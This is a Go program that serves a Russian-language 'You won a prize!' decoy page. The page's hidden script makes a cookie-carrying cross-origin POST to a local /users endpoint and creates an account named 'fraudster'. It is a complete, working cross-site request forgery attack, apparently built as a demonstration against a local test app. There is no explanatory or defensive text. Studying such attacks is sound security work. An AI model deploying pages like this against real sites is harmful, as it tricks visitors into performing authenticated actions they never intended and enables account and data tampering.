package main

import (
	"log"
	"net/http"
)

const page = `<!DOCTYPE html>
<html lang="ru">
<head><meta charset="utf-8"><title>Приз</title></head>
<body>
<h1>Вы выиграли приз!</h1>
<script>
fetch('http://localhost:8080/users', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({name: 'мошенник', birth_day: '2001-09-11'})
});
</script>
</body>
</html>`

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(page))
	})
	log.Println("мошенник: http://localhost:9000")
	log.Fatal(http.ListenAndServe(":9000", nil))
}
